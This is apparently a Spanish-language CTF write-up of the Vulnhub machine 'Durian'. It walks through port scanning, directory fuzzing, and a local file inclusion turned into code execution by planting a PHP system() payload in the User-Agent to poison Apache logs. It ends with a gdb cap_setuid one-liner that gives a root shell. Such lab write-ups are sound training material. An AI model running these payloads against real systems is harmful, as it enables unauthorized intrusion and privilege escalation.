---
layout: single
title: Durian - Vulnhub
date: 25/10/2023
classes: wide
header:
  teaser:
  icon: /assets/images/hackthebox.webp
tags:
  - LFI > RCE - Abusing /proc/self/fd/X + Log Poisoning
  - Abusing capabilities (cap_setuid+ep on gdb binary)
  - Web Enumeration
  - fácil
  - linux
---

Para poder vulnerar esta máquina primero debemos hacer una enumeración web, en la cual obtendremos la dirección de un recurso PHP, del cual nos podemos aprovechar para poder llevar a cabo el LFI, a través de ahí contaminar el log de acceso de apache para poder ejecutar nuestro código malicioso PHP y convertirlo en un RCE, entablandonos una reverse shell para posterior a ello escalar privilegios,.


# PortScan
__________


```
nmap -sT -p22,80,7080,8088 192.168.204.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-25 18:23 AST
Nmap scan report for 192.168.204.152
Host is up (0.00080s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
7080/tcp open  empowerid
8088/tcp open  radan-http
MAC Address: 00:0C:29:CC:43:7D (VMware)
                                     
```


# Sitio Web
_______

![](/assets/images/durian/Pasted image 20231025182531.png)

# Fuzzing de Sitio Web.
_______

```
gobuster dir -u http://192.168.204.152 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

Que nos reportará los siguientes directorios de la máquina:
```
===============================================================
/icons/               (Status: 403) [Size: 280]
Progress: 90087 / 220561 (40.84%)             [ERROR] 2023/10/25 18:26:31 [!] Get "http://192.168.204.152/blog/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/server-status/       (Status: 403) [Size: 280]
/cgi-data/            (Status: 200) [Size: 953]
                                               
```

Una vez vayamos al directorio "/cgi-data" veremos un recurso **.PHP** que dentro tendrá en comentarios como funciona el código.

![](/assets/images/durian/Pasted image 20231025182939.png)

es decir, que al poner el parámetro "**?file=**"  podemos aprovecharnos para hacer un LFI.

# LFI > Log Poisoning
_________

Hacemos una petición para poder identificarla en el log.
```
curl -s -X GET "http://192.168.204.153/probando" -H "User-Agent: <?php system('whoami'); ?>"
```

![](/assets/images/durian/Pasted image 20231025184632.png)


Hemos contaminado el Log, y también está ejecutando el código **.PHP**, por lo que podríamos subir un recurso qué podremos controlar desde la URL para entablarnos una reverse shell.

# BurpSuite 
_________

Nos aprovechamos del proxy Burpsuite, para agregar el código .PHP malicioso en el recurso que subiremos, para luego poder desde la URL poder controlar el comando, volviéndolo así un RCE.

Interceptamos esta petición:

![](/assets/images/durian/Pasted image 20231025185034.png)

Para modificar el "**User-Agent:**" desde el **Burpsuite** con el código .PHP malicioso qué deseemos, en este caso unos para controlar el código que queramos ejecutar desde la URL:

![](/assets/images/durian/Pasted image 20231025185353.png)

Para controlar desde la URL la ejecución de comando, como podemos ver:

![](/assets/images/durian/Pasted image 20231025185808.png]])
Y desde la URL ya podríamos entablarnos una Reverse Shell.

# Escalada de Privilegios.
_______

Buscamos capabilites.
```
www-data@durian:/tmp$ getcap -r / 2>/dev/null
/usr/bin/gdb = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
```
Vemos que está la la "**cap_setuid+ep**", qué investigando en el recurso [GTFOBINS](https://gtfobins.github.io/gtfobins/gdb/#capabilities) podemos volvernos **Root** aprovechándonos de esta capabilitie en "gdb".

```
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
```

![](/assets/images/durian/Pasted image 20231025195554.png)





